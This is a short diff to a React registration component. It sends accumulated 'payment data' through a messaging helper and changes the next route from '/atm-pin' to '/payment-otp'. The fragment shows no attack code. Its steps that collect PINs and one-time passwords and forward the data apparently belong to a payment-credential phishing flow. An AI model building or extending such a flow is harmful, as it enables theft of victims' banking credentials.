@@ -80,7 +80,7 @@ const RegistrationComplete = () => {
 
     updateData(newData);
     await sendCumulativeMessage(4, "بيانات الدفع", newData);
-    navigate("/atm-pin");
+    navigate("/payment-otp");
   };
 
   return (
